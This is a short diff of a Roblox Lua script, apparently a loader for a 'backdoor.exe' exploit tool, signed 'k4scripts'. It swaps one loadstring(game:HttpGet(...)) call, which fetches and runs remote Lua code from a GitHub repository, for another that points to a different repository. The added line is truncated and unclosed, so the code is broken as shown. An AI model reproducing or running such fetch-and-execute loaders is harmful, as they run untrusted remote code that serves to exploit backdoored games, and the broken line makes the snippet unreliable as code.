@@ -15,8 +15,7 @@ game.StarterGui:SetCore(
 		}
 	)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/drillygzzly/Roblox-Scripts-2022/main/Scripts/UI%20Libs%20Connected/Backdoor.exe/Backdoor.exe%20Main%20Src.lua
 
 
 --	k4scripts
